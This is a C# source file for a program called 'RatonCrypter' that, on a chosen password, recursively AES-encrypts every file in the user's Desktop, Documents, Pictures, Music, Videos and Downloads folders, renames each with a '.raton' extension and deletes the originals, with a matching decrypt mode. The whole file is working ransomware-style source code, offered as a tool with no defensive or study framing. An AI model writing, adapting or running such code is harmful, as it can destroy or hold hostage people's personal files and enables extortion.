using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Threading.Tasks;

class RatonCrypter
{
    static void Main()
    {
        // error handling
        AppDomain.CurrentDomain.UnhandledException += (s, e) => {
            Console.WriteLine("[UNHANDLED] Error: " + ((Exception)e.ExceptionObject).Message);
        };

        TaskScheduler.UnobservedTaskException += (s, e) => {
            Console.WriteLine("[UNHANDLED] Error: " + e.Exception.Message);
            e.SetObserved();
        };

        Console.Write("Password: ");
        string password = Console.ReadLine();

        Console.Write("¿(E)ncrypt or (D)ecrypt? ");
        string option = Console.ReadLine().ToUpper();

        try
        {
            if (option == "E")
                Encrypt(password);
            else if (option == "D")
                Decrypt(password);
            else
                Console.WriteLine("Wtf is that option...");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[✘] Error: " + ex.Message);
        }
    }

    private static void GetKey(string password, out byte[] key, out byte[] iv)
    {
        byte[] salt = Encoding.UTF8.GetBytes("SILLY_SALT");
        using (var keyDerivation = new Rfc2898DeriveBytes(password, salt, 10000))
        {
            key = keyDerivation.GetBytes(32);
            iv = keyDerivation.GetBytes(16);
        }
    }
    public static void Encrypt(string password)
    {
        GetKey(password, out byte[] key, out byte[] iv);
        // use ur brain genius!1111111111
        var targetDirectories = new[] {
      Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
        Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
        Environment.GetFolderPath(Environment.SpecialFolder.MyComputer),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
    };

        foreach (string dir in targetDirectories)
        {
            foreach (string file in GetAllFiles(dir))
            {
                if (!file.EndsWith(".raton"))
                {
                    string encryptedPath = file + ".raton";
                    try
                    {
                        EncryptFile(file, encryptedPath, key, iv);
                        File.Delete(file);
                        Console.WriteLine("[✔] Encrypted: " + file);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[✘] Error Encrypting: " + file + " → " + ex.Message);
                    }
                }
            }
        }
    }

    public static void Decrypt(string password)
    {
        string userFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        GetKey(password, out byte[] key, out byte[] iv);

        foreach (string file in GetAllFiles(userFolder))
        {
            if (!file.EndsWith(".raton")) continue;

            string originalPath = file.Substring(0, file.Length - ".raton".Length);
            string finalPath = originalPath;

            if (File.Exists(originalPath))
            {
                string dir = Path.GetDirectoryName(originalPath);
                string name = Path.GetFileNameWithoutExtension(originalPath);
                string ext = Path.GetExtension(originalPath);
                finalPath = Path.Combine(dir, name + "_decrypted" + ext);
            }

            try
            {
                DecryptFile(file, finalPath, key, iv);
                File.Delete(file);
                Console.WriteLine("[✔] Decrypting: " + file);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[✘] Error Decrypting: " + file + " → " + ex.Message);
            }
        }
    }

    private static IEnumerable<string> GetAllFiles(string root)
    {
        var files = new List<string>();

        try
        {
            foreach (var file in Directory.GetFiles(root))
            {
                files.Add(file);
            }

            foreach (var dir in Directory.GetDirectories(root))
            {
                try
                {
                    files.AddRange(GetAllFiles(dir));
                }
                catch { } // Denied subfolder
            }
        }
        catch { } // Denied folder

        return files;
    }

    private static void EncryptFile(string inputFile, string outputFile, byte[] key, byte[] iv)
    {
        using (FileStream input = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
        using (FileStream output = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (CryptoStream cryptoStream = new CryptoStream(output, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                input.CopyTo(cryptoStream);
            }
        }
    }

    private static void DecryptFile(string inputFile, string outputFile, byte[] key, byte[] iv)
    {
        using (FileStream input = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
        using (FileStream output = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (CryptoStream cryptoStream = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read))
            {
                cryptoStream.CopyTo(output);
            }
        }
    }
}
